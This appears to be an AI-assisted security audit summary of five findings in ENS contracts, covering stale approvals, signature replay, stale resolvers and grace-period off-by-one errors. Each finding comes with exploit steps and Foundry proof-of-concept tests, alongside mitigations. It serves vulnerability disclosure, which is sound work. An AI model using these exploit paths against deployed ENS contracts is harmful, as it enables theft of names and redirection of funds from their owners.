# ens-contracts Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/ens-contracts/report/audit-report.md`
Finding count: `5`

## Findings

### C-1 / `_qAeE89D1CAdrEK_KI7DX`
- Finding title: Expired ENS names can receive hidden ERC721 approvals that become active again after renewal
- Report lines: 159-262
```md
## [C-1]. Expired ENS names can receive hidden ERC721 approvals that become active again after renewal

## id: _qAeE89D1CAdrEK_KI7DX

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AuthByPass

## Location
BaseRegistrarImplementation.approve

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the in-scope production contract BaseRegistrarImplementation, which overrides ownerOf() and _isApprovedOrOwner() to treat expired names as unowned, but does not override ERC721.approve(). With OpenZeppelin 4.9.x, inherited approve() resolves the owner using ERC721.ownerOf(tokenId), i.e. the base ERC721 storage owner, not the registrar's expiry-aware ownerOf(). Therefore, while expiries[id] <= block.timestamp, public BaseRegistrarImplementation.ownerOf(id) reverts and transfer/reclaim authorization through _isApprovedOrOwner() is blocked, but the stale ERC721 owner or an operator approved for that stale owner can still call approve(attacker, id). renew() only increments expiries[id] and does not clear token approvals. Once renewed, _isApprovedOrOwner() sees a live owner and accepts getApproved(id) == attacker, allowing transferFrom() or reclaim(). No complete safeguard is shown: expiry checks exist in ownerOf() and _isApprovedOrOwner(), but the exact approval path bypasses them; renew() does not clear approvals; and setApprovalForAll revocation does not clear per-token approvals. The exploit does not require admin/controller compromise: renewal is performed through normal controller flows, and the malicious actor can be a previously approved non-privileged operator using public ERC721 approval/transfer functions. The scenario depends on normal protocol/lifecycle behavior, not a victim-only arbitrary mistake or future integration. No documentation in the supplied material explicitly accepts hidden approvals on expired names as intended behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BaseRegistrarImplementation overrides ownerOf() and _isApprovedOrOwner() so expired names are treated as unowned, but it inherits OpenZeppelin ERC721.approve() unchanged. In OZ 4.9, approve() uses ERC721.ownerOf(tokenId) internally, which bypasses BaseRegistrarImplementation.ownerOf() and reads the stale ERC721 owner stored before expiry. As a result, an old owner or previously approved operator can set a per-token approval while the name is expired and public ownerOf(id) reverts. If the name is renewed during the grace period, that stale approval immediately becomes usable for transferFrom() or reclaim(). Vulnerable snippet: function ownerOf(uint256 tokenId) public view override(IERC721, ERC721) returns (address) { require(expiries[tokenId] > block.timestamp); return super.ownerOf(tokenId); } ... function _isApprovedOrOwner(address spender,uint256 tokenId) internal view override returns (bool) { address owner = ownerOf(tokenId); return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender)); } The missing override is approve(): inherited ERC721.approve() does not apply the expiry-aware ownerOf() gate.

## Impact
Direct theft of an ENS ERC721 name after renewal. A previously approved operator can preserve authority as a per-token approval while the name is expired, survive later operator revocation, and transfer the NFT once the victim renews during grace.

## Proof of Concept
1. Alice owns an ENS registrar token and has previously approved an operator, such as a marketplace, with setApprovalForAll. 2. The name expires but remains inside the 90 day grace period, so BaseRegistrarImplementation.ownerOf(id) reverts and the name is supposed to be unowned for authorization purposes. 3. Before Alice renews, the old operator calls inherited approve(attacker, id). This succeeds because ERC721.approve() uses the stale internal ERC721 owner instead of the registrar's expiry-aware ownerOf(). 4. Alice revokes the operator approval and renews the name during grace. 5. The attacker's per-token approval is still stored, so attacker calls transferFrom(alice, attacker, id) and steals the renewed ENS NFT.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/ethregistrar/BaseRegistrarImplementation.sol";

contract MockENS is ENS {
    mapping(bytes32 => address) public owners;
    function setOwnerForTest(bytes32 node, address owner_) external { owners[node] = owner_; }
    function owner(bytes32 node) external view override returns (address) { return owners[node]; }
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner_) external override returns (bytes32) { bytes32 subnode = keccak256(abi.encodePacked(node, label)); owners[subnode] = owner_; return subnode; }
    function setResolver(bytes32, address) external override {}
    function setRecord(bytes32 node, address owner_, address, uint64) external override { owners[node] = owner_; }
    function setSubnodeRecord(bytes32 node, bytes32 label, address owner_, address, uint64) external override { owners[keccak256(abi.encodePacked(node, label))] = owner_; }
    function setOwner(bytes32 node, address owner_) external override { owners[node] = owner_; }
    function setTTL(bytes32, uint64) external override {}
    function setApprovalForAll(address, bool) external override {}
    function resolver(bytes32) external pure override returns (address) { return address(0); }
    function ttl(bytes32) external pure override returns (uint64) { return 0; }
    function recordExists(bytes32 node) external view override returns (bool) { return owners[node] != address(0); }
    function isApprovedForAll(address, address) external pure override returns (bool) { return false; }
}

contract ExpiredApprovalPoC is Test {
    MockENS ens;
    BaseRegistrarImplementation registrar;
    bytes32 baseNode = keccak256("eth");
    uint256 id = uint256(keccak256("alice"));
    address controller = address(0xC011);
    address alice = address(0xA11CE);
    address operator = address(0x0A0A);
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.warp(100 days);
        ens = new MockENS();
        registrar = new BaseRegistrarImplementation(ens, baseNode);
        ens.setOwnerForTest(baseNode, address(registrar));
        registrar.addController(controller);
    }

    function testExpiredApprovalBecomesActiveAfterRenewal() public {
        vm.prank(controller);
        uint256 expiry = registrar.register(id, alice, 30 days);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, true);

        vm.warp(expiry + 1);
        vm.expectRevert();
        registrar.ownerOf(id);

        vm.prank(operator);
        registrar.approve(attacker, id);
        assertEq(registrar.getApproved(id), attacker);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, false);
        assertEq(registrar.isApprovedForAll(alice, operator), false);

        vm.prank(controller);
        registrar.renew(id, 365 days);
        assertEq(registrar.ownerOf(id), alice);

        vm.prank(attacker);
        registrar.transferFrom(alice, attacker, id);
        assertEq(registrar.ownerOf(id), attacker);
    }
}


## Suggested Mitigation
Override approve() to use the expiry-aware ownerOf() or _isApprovedOrOwner() path, and reject approvals when expiries[tokenId] <= block.timestamp. Consider also overriding getApproved()/transfer authorization helpers consistently for expired names or clearing approvals when a name expires/renews.
```

### M-2 / `51MUeJkjADHOWM6JQl0XX`
- Finding title: Reusable reverse-name signatures let stale relayers overwrite newer DefaultReverseRegistrar records
- Report lines: 263-344
```md
## [M-2]. Reusable reverse-name signatures let stale relayers overwrite newer DefaultReverseRegistrar records

## id: 51MUeJkjADHOWM6JQl0XX

## Derived From Pattern/Invariant
PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
DefaultReverseRegistrar.setNameForAddrWithSignature

## Finding Status: Valid
### Finding Status Justification: The cited function exists in the in-scope DefaultReverseRegistrar. setNameForAddrWithSignature builds a message from address(this), selector, addr, signatureExpiry, and name, validates the signature, then calls _setName(addr, name). StandaloneReverseRegistrar._setName unconditionally overwrites _names[addr]. There is no nonce, used-digest mapping, monotonic version, or check that the current value has not changed since signing. signatureExpiry is a partial time bound, capped to at most one hour from validation time, but it does not consume the authorization and therefore does not fully block replay within the live window. The execution path is permissionless because any caller can submit the still-valid signature. This does not require a privileged role or compromised key; the signer intentionally authorizes a normal protocol flow, and the protocol flaw is that the authorization remains reusable after a newer record is set. No supplied code or documentation explicitly accepts stale replay overwriting newer reverse records as intended behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`setNameForAddrWithSignature` validates that `addr` signed the `(registrar, selector, addr, expiry, name)` tuple, but it never binds the authorization to a nonce and never consumes the signature after use. Any relayer or observer that obtains a still-unexpired signature can submit it repeatedly until `signatureExpiry`, including after the address owner has already set a newer reverse name. Vulnerable snippet: `signature.validateSignatureWithExpiry(addr, message, signatureExpiry); _setName(addr, name);`. Because `_setName` simply overwrites `_names[addr]`, the last replayed stale signature wins.

## Impact
Temporary griefing of reverse-name identity for the target address during the allowed signature window. Off-chain consumers that display reverse records can be forced back to an older signed name even after the owner submits a newer update. Under the ENS Immunefi scope this maps to Medium griefing rather than theft, because it does not transfer funds or NFTs.

## Proof of Concept
1. Alice signs an off-chain authorization to set her reverse name to `old.eth` with an expiry up to one hour in the future. 2. The relayer submits it once and `nameForAddr(alice)` becomes `old.eth`. 3. Alice updates her reverse name to `new.eth` using `setName("new.eth")` or a newer signature. 4. Before the old signature expires, any stale signature holder calls `setNameForAddrWithSignature(alice, oldExpiry, "old.eth", oldSig)` again. 5. The registrar accepts the same signature again because no nonce or used-message flag exists, and Alice's visible reverse name is overwritten back to `old.eth`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts-v5/utils/cryptography/MessageHashUtils.sol";
import "../contracts/reverseRegistrar/DefaultReverseRegistrar.sol";

contract DefaultReverseRegistrarReplayPoC is Test {
    using MessageHashUtils for bytes32;

    DefaultReverseRegistrar registrar;
    uint256 alicePk = 0xA11CE;
    address alice;

    function setUp() public {
        alice = vm.addr(alicePk);
        registrar = new DefaultReverseRegistrar();
    }

    function _signature(string memory name, uint256 expiry) internal view returns (bytes memory) {
        bytes32 message = keccak256(
            abi.encodePacked(
                address(registrar),
                registrar.setNameForAddrWithSignature.selector,
                alice,
                expiry,
                name
            )
        ).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, message);
        return abi.encodePacked(r, s, v);
    }

    function test_staleSignatureCanBeReplayedToOverwriteNewName() public {
        uint256 expiry = block.timestamp + 1 hours;
        bytes memory oldSig = _signature("old.eth", expiry);

        registrar.setNameForAddrWithSignature(alice, expiry, "old.eth", oldSig);
        assertEq(registrar.nameForAddr(alice), "old.eth");

        vm.prank(alice);
        registrar.setName("new.eth");
        assertEq(registrar.nameForAddr(alice), "new.eth");

        registrar.setNameForAddrWithSignature(alice, expiry, "old.eth", oldSig);
        assertEq(registrar.nameForAddr(alice), "old.eth");
    }
}

## Suggested Mitigation
Add per-address nonces to the signed payload and increment/consume the nonce before writing the new name, or store `usedDigest[message] = true` and reject reused authorizations. Prefer an EIP-712 domain that includes `chainId`, `verifyingContract`, nonce, expiry, and name.
```

### C-3 / `J8z405q9aEEOyFyX089YE`
- Finding title: Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution
- Report lines: 345-474
```md
## [C-3]. Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution

## id: J8z405q9aEEOyFyX089YE

## Derived From Pattern/Invariant
AccountingInvariantViolation / stale resolver state must not survive expired re-registration without an explicit resolver

## Exploit Type
AccountingInvariantViolation

## Location
ETHRegistrarController.register

## Finding Status: Valid
### Finding Status Justification: The described code path exists in in-scope production contracts. In ETHRegistrarController.register, the resolver-zero branch calls base.register(labelhash, registration.owner, duration) and does not call ens.setRecord or otherwise clear resolver/TTL. BaseRegistrarImplementation._register, with updateRegistry=true, updates expiries, burns any expired ERC721, mints the token to the new owner, and calls ens.setSubnodeOwner(baseNode, bytes32(id), owner). ENSRegistry.setSubnodeOwner only updates records[subnode].owner through _setOwner and emits NewOwner; it does not change records[subnode].resolver or records[subnode].ttl. Therefore a resolver address previously set for the node can persist after re-registration. If the previous registrant selected a resolver contract they control, that resolver can continue returning or changing resolution data even after registry ownership moves to the new registrant, until the new registrant changes the resolver. The no-resolver path is explicitly supported by makeCommitment, provided data and reverseRecord are absent, so the preconditions are not impossible. There is no complete safeguard in this path: availability/grace-period checks only gate re-registration, and ownership transfer does not clear stale resolver state. This does not require privileged access, compromised keys, or purely victim misuse; it arises from normal public registration behavior with resolver == address(0). No supplied documentation explicitly accepts this exact stale resolver control risk as intentional, and the issue exists in the current code rather than depending on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When an expired name is re-registered with registration.resolver == address(0), ETHRegistrarController only calls base.register(id, registration.owner, duration). BaseRegistrarImplementation then updates the ENS subnode owner through ens.setSubnodeOwner(...), but ENSRegistry.setSubnodeOwner changes only records[subnode].owner and does not clear records[subnode].resolver or TTL. As a result, a resolver set by the previous registrant remains the active resolver for the newly registered name. If the old resolver is controlled by the old registrant, the old registrant can keep changing what the new owner's name resolves to after the NFT has been minted to the new owner. Vulnerable flow: `if (registration.resolver == address(0)) { expires = base.register(uint256(labelhash), registration.owner, registration.duration); }`; supporting registrar code then calls only `ens.setSubnodeOwner(baseNode, bytes32(id), owner);`, leaving the previous resolver untouched.

## Impact
The previous registrant can keep controlling resolution for a name now owned by a new user whenever the new registration uses the supported no-resolver path. This can redirect payments or integrations that resolve the name, causing direct theft of funds in motion and unintended alteration of what the ENS NFT/name represents until the new owner notices and updates the resolver.

## Proof of Concept
1. The attacker registers `stale.eth` with a resolver contract they control and configures it to resolve to the attacker's address. 2. The name expires and passes the registrar grace period, so it becomes available. 3. A victim registers the same label through ETHRegistrarController with `registration.resolver == address(0)`, which is an explicitly supported branch. 4. The controller/base registrar mints the ERC721 to the victim and updates ENS ownership, but the ENS resolver remains the attacker's resolver. 5. The attacker updates their resolver to a new receiving address after the victim owns the NFT. 6. Users or integrations resolving `stale.eth` receive the attacker's address and can send funds to the attacker while the victim is the registrar owner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "contracts/registry/ENSRegistry.sol";
import "contracts/ethregistrar/BaseRegistrarImplementation.sol";
import "contracts/ethregistrar/ETHRegistrarController.sol";
import "contracts/ethregistrar/IPriceOracle.sol";
import "contracts/resolvers/profiles/IAddrResolver.sol";

contract FixedPriceOracle is IPriceOracle {
    function price(string calldata, uint256, uint256) external pure returns (IPriceOracle.Price memory) {
        return IPriceOracle.Price({base: 1 ether, premium: 0});
    }
}

contract MutableResolver is IAddrResolver {
    address public controller;
    address payable public target;
    constructor(address payable initialTarget) { controller = msg.sender; target = initialTarget; }
    function setTarget(address payable newTarget) external { require(msg.sender == controller); target = newTarget; }
    function addr(bytes32) external view returns (address payable) { return target; }
    function supportsInterface(bytes4) external pure returns (bool) { return false; }
}

contract NoopReverseRegistrar is IReverseRegistrar {
    function setDefaultResolver(address) external {}
    function claim(address) external pure returns (bytes32) { return bytes32(0); }
    function claimForAddr(address, address, address) public pure returns (bytes32) { return bytes32(0); }
    function claimWithResolver(address, address) external pure returns (bytes32) { return bytes32(0); }
    function setName(string memory) external pure returns (bytes32) { return bytes32(0); }
    function setNameForAddr(address, address, address, string memory) external pure returns (bytes32) { return bytes32(0); }
    function node(address) external pure returns (bytes32) { return bytes32(0); }
}

contract NoopDefaultReverseRegistrar is IDefaultReverseRegistrar {
    function setName(string memory) external {}
    function setNameForAddrWithSignature(address, uint256, string memory, bytes memory) external {}
    function setNameForAddr(address, string memory) external {}
}

contract ETHRegistrarControllerStaleResolverPoC is Test {
    bytes32 constant ETH_NODE = 0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;
    ENSRegistry ens;
    BaseRegistrarImplementation base;
    ETHRegistrarController controller;
    FixedPriceOracle oracle;
    MutableResolver oldResolver;
    address oldOwner = address(0xA11CE);
    address newOwner = address(0xB0B);
    address payable attackerSink1 = payable(address(0x1111));
    address payable attackerSink2 = payable(address(0x2222));

    function setUp() public {
        vm.warp(1000 days);
        ens = new ENSRegistry();
        base = new BaseRegistrarImplementation(ENS(address(ens)), ETH_NODE);
        bytes32 ethLabel = keccak256(bytes("eth"));
        ens.setSubnodeOwner(bytes32(0), ethLabel, address(base));
        oracle = new FixedPriceOracle();
        controller = new ETHRegistrarController(base, oracle, 1, 90 days, IReverseRegistrar(address(new NoopReverseRegistrar())), IDefaultReverseRegistrar(address(new NoopDefaultReverseRegistrar())), ENS(address(ens)));
        base.addController(address(controller));
        oldResolver = new MutableResolver(attackerSink1);
    }

    function _commitAndRegister(ETHRegistrarController.Registration memory r, address caller) internal returns (uint256) {
        bytes32 c = controller.makeCommitment(r);
        controller.commit(c);
        vm.warp(block.timestamp + 2);
        vm.deal(caller, 10 ether);
        vm.prank(caller);
        controller.register{value: 1 ether}(r);
        return base.nameExpires(uint256(keccak256(bytes(r.label))));
    }

    function testExpiredReregistrationKeepsPriorResolverControl() public {
        ETHRegistrarController.Registration memory first = ETHRegistrarController.Registration({label: "stale", owner: oldOwner, duration: 28 days, secret: bytes32("old"), resolver: address(oldResolver), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        uint256 expires = _commitAndRegister(first, oldOwner);
        bytes32 node = keccak256(abi.encodePacked(ETH_NODE, keccak256(bytes("stale"))));
        assertEq(ens.owner(node), oldOwner);
        assertEq(ens.resolver(node), address(oldResolver));
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink1);

        vm.warp(expires + base.GRACE_PERIOD() + 1);

        ETHRegistrarController.Registration memory second = ETHRegistrarController.Registration({label: "stale", owner: newOwner, duration: 28 days, secret: bytes32("new"), resolver: address(0), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        _commitAndRegister(second, newOwner);

        assertEq(base.ownerOf(uint256(keccak256(bytes("stale")))), newOwner);
        assertEq(ens.owner(node), newOwner);
        assertEq(ens.resolver(node), address(oldResolver));

        oldResolver.setTarget(attackerSink2);
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink2);
    }
}

## Suggested Mitigation
When registering without an explicit resolver, clear resolver and TTL for the namehash instead of only changing ownership. For example, have the controller call `ens.setRecord(namehash, registration.owner, address(0), 0)` after `base.register(...)`, or add a registrar path that updates the registry owner and clears resolver/TTL atomically for re-registrations.
```

### M-7 / `6a-XhkrZKMLYM7rhTBUe9`
- Finding title: Stale token approvals survive transfers after CANNOT_APPROVE, letting an old approved address extend subnames
- Report lines: 738-784
```md
## [M-7]. Stale token approvals survive transfers after CANNOT_APPROVE, letting an old approved address extend subnames

## id: 6a-XhkrZKMLYM7rhTBUe9

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
NameWrapper._beforeTransfer

## Finding Status: Valid
### Finding Status Justification: The root cause exists in in-scope NameWrapper/ERC1155Fuse code. NameWrapper.approve blocks new approvals once CANNOT_APPROVE is burned. However, NameWrapper._beforeTransfer deletes _tokenApprovals[id] only when CANNOT_APPROVE is not burned, so an approval set before burning CANNOT_APPROVE survives a later transfer. ERC1155Fuse._transfer then updates the owner but does not otherwise clear approvals. Because canExtendSubnames authorizes getApproved(uint256(node)) == addr, the old approved address remains able to call extendExpiry for children under the transferred parent, while the recipient cannot clear that per-token approval through approve because CANNOT_APPROVE makes approve revert. There is no complete safeguard shown that invalidates the stale approval on transfer or excludes approvals from canExtendSubnames. This is current production-scope code, not an accepted documented design risk, does not require a privileged or compromised protocol role, and is not solely victim misuse because normal public approval, fuse, transfer, and extension flows create the stale authority.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
NameWrapper preserves a per-token approval when CANNOT_APPROVE is burned, even though the token is being transferred to a new owner. Vulnerable snippet: if (fuses & CANNOT_APPROVE == 0) { delete _tokenApprovals[id]; }. Because approve() reverts once CANNOT_APPROVE is burned, the recipient cannot clear the stale approval. canExtendSubnames() then treats getApproved(uint256(node)) == addr as authorization, so the old approved address remains authorized to extend subname expiries under the transferred parent.

## Impact
Medium griefing and authorization bypass: a stale approved address can keep extending child name expiries up to the parent expiry after the parent name is sold or transferred, preventing the new owner from letting unwanted subnames expire during the parent validity period.

## Proof of Concept
1. Alice owns a wrapped parent name with PARENT_CANNOT_CONTROL and CANNOT_UNWRAP burned but CANNOT_TRANSFER unburned. 2. Alice approves Extender for the token. 3. Alice burns CANNOT_APPROVE. 4. Alice transfers the wrapped name to Bob. 5. _beforeTransfer does not delete _tokenApprovals[tokenId] because CANNOT_APPROVE is burned. 6. Bob cannot clear the approval because approve() reverts. 7. Extender continues satisfying canExtendSubnames(parentNode, Extender) and can extend children without Bob's consent.

## Proof of Code
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import {NameWrapper} from "../contracts/wrapper/NameWrapper.sol";
import {ENS} from "../contracts/registry/ENS.sol";
import {IBaseRegistrar} from "../contracts/ethregistrar/IBaseRegistrar.sol";
import {IMetadataService} from "../contracts/wrapper/IMetadataService.sol";
import {PARENT_CANNOT_CONTROL,CANNOT_UNWRAP,CANNOT_APPROVE} from "../contracts/wrapper/INameWrapper.sol";
contract MockENS { mapping(bytes32 => address) public owners; function setOwnerRaw(bytes32 node, address owner) external { owners[node] = owner; } function owner(bytes32 node) external view returns (address) { return owners[node]; } }
contract MockReverseRegistrar { function claim(address) external pure returns (bytes32) { return bytes32(0); } }
contract MockMetadata is IMetadataService { function uri(uint256) external pure returns (string memory) { return ""; } }
contract Empty {}
contract Harness is NameWrapper { constructor(ENS ens_, IBaseRegistrar registrar_, IMetadataService metadata_) NameWrapper(ens_, registrar_, metadata_) {} function setDataRaw(bytes32 node, address owner, uint32 fuses, uint64 expiry) external { _setData(node, owner, fuses, expiry); } }
contract StaleApprovalPoC is Test { bytes32 constant ADDR_REVERSE_NODE = 0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2; function deployWrapper() internal returns (Harness h) { MockENS ens = new MockENS(); MockReverseRegistrar reverse = new MockReverseRegistrar(); ens.setOwnerRaw(ADDR_REVERSE_NODE, address(reverse)); h = new Harness(ENS(address(ens)), IBaseRegistrar(address(new Empty())), new MockMetadata()); } function test_staleApprovalCanStillExtendSubnamesAfterTransfer() public { Harness h = deployWrapper(); bytes32 parent = keccak256("parent.eth"); uint256 id = uint256(parent); address alice = address(0xA11CE); address bob = address(0xB0B); address extender = address(0xE77E); uint64 expiry = uint64(block.timestamp + 365 days); h.setDataRaw(parent, alice, uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP), expiry); vm.prank(alice); h.approve(extender, id); h.setDataRaw(parent, alice, uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_APPROVE), expiry); vm.prank(alice); h.safeTransferFrom(alice, bob, id, 1, ""); assertEq(h.ownerOf(id), bob); assertEq(h.getApproved(id), extender); assertTrue(h.canExtendSubnames(parent, extender)); } }

## Suggested Mitigation
Always clear _tokenApprovals[id] on any transfer, regardless of CANNOT_APPROVE. CANNOT_APPROVE should block setting new approvals, not preserve pre-existing approvals across ownership changes.
```

### M-9 / `lVVCkIB8v6NnxPXfbcKu2`
- Finding title: Strict less-than grace-period checks let expired .eth names be transferred at the registrar expiry timestamp
- Report lines: 831-877
```md
## [M-9]. Strict less-than grace-period checks let expired .eth names be transferred at the registrar expiry timestamp

## id: lVVCkIB8v6NnxPXfbcKu2

## Derived From Pattern/Invariant
TimestampOrBlockManipulation

## Exploit Type
TimestampDependentLogic

## Location
NameWrapper._isETH2LDInGracePeriod

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in in-scope production code. NameWrapper stores .eth wrapper expiry as registrarExpiry + GRACE_PERIOD, and _isETH2LDInGracePeriod checks expiry - GRACE_PERIOD < block.timestamp. At block.timestamp == registrarExpiry this evaluates false, so canModifyName still authorizes the wrapped owner/operator. _beforeTransfer similarly subtracts GRACE_PERIOD and only treats the name as expired when registrarExpiry < block.timestamp, so a transfer is not blocked at equality unless CANNOT_TRANSFER is burned. BaseRegistrarImplementation.ownerOf uses expiries[tokenId] > block.timestamp, so the registrar already treats the same name as expired at equality. No complete safeguard in the provided code closes this exact equality gap. The path is in NameWrapper.sol, listed in scope, and does not require admin, leaked keys, or victim misuse; it requires a stale wrapped owner/operator using public wrapper permissions at the boundary timestamp. The behavior is not explicitly documented as an accepted risk and is present in current code, not dependent on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The wrapper intends .eth 2LDs to enter grace-period restrictions when registrar expiry is reached, but both grace checks use strict less-than comparisons. Vulnerable snippets: expiry - GRACE_PERIOD < block.timestamp in _isETH2LDInGracePeriod and if (expiry < block.timestamp) after subtracting GRACE_PERIOD in _beforeTransfer. At block.timestamp == registrar.nameExpires(labelhash), the registrar considers the name expired, but NameWrapper still lets the stale wrapped owner modify or transfer the wrapped token.

## Impact
Medium griefing and unauthorized state change: at the first grace-period timestamp, a stale owner or already-approved operator can transfer or mutate an expired wrapped .eth name. If the name is later renewed, the wrapper preserves the attacker-chosen owner set during the boundary transaction.

## Proof of Concept
1. A .eth 2LD is wrapped with wrapper expiry equal to registrarExpiry + GRACE_PERIOD. 2. Time reaches exactly registrarExpiry. 3. registrar.ownerOf(tokenId) would now revert because BaseRegistrarImplementation requires expiries[tokenId] > block.timestamp. 4. NameWrapper.canModifyName still returns true because registrarExpiry < block.timestamp is false at equality. 5. _beforeTransfer also treats the name as not expired because registrarExpiry < block.timestamp is false. 6. The stale wrapped owner or operator transfers the expired wrapper token before grace-period restrictions begin one second later.

## Proof of Code
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import {NameWrapper} from "../contracts/wrapper/NameWrapper.sol";
import {ENS} from "../contracts/registry/ENS.sol";
import {IBaseRegistrar} from "../contracts/ethregistrar/IBaseRegistrar.sol";
import {IMetadataService} from "../contracts/wrapper/IMetadataService.sol";
import {PARENT_CANNOT_CONTROL,IS_DOT_ETH} from "../contracts/wrapper/INameWrapper.sol";
contract MockENS { mapping(bytes32 => address) public owners; function setOwnerRaw(bytes32 node, address owner) external { owners[node] = owner; } function owner(bytes32 node) external view returns (address) { return owners[node]; } }
contract MockReverseRegistrar { function claim(address) external pure returns (bytes32) { return bytes32(0); } }
contract MockMetadata is IMetadataService { function uri(uint256) external pure returns (string memory) { return ""; } }
contract Empty {}
contract Harness is NameWrapper { constructor(ENS ens_, IBaseRegistrar registrar_, IMetadataService metadata_) NameWrapper(ens_, registrar_, metadata_) {} function setDataRaw(bytes32 node, address owner, uint32 fuses, uint64 expiry) external { _setData(node, owner, fuses, expiry); } }
contract GraceBoundaryPoC is Test { bytes32 constant ADDR_REVERSE_NODE = 0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2; function deployWrapper() internal returns (Harness h) { MockENS ens = new MockENS(); MockReverseRegistrar reverse = new MockReverseRegistrar(); ens.setOwnerRaw(ADDR_REVERSE_NODE, address(reverse)); h = new Harness(ENS(address(ens)), IBaseRegistrar(address(new Empty())), new MockMetadata()); } function test_transferAllowedExactlyAtRegistrarExpiry() public { Harness h = deployWrapper(); bytes32 node = keccak256("expired.eth"); uint256 id = uint256(node); address alice = address(0xA11CE); address bob = address(0xB0B); uint64 registrarExpiry = uint64(block.timestamp + 10 days); uint64 wrapperExpiry = registrarExpiry + 90 days; h.setDataRaw(node, alice, uint32(PARENT_CANNOT_CONTROL | IS_DOT_ETH), wrapperExpiry); vm.warp(registrarExpiry); assertTrue(h.canModifyName(node, alice)); vm.prank(alice); h.safeTransferFrom(alice, bob, id, 1, ""); assertEq(h.ownerOf(id), bob); vm.warp(registrarExpiry + 1); assertFalse(h.canModifyName(node, bob)); } }

## Suggested Mitigation
Use inclusive grace-period checks. _isETH2LDInGracePeriod should return true when expiry - GRACE_PERIOD <= block.timestamp, and _beforeTransfer should treat .eth 2LDs as expired when registrarExpiry <= block.timestamp.
```
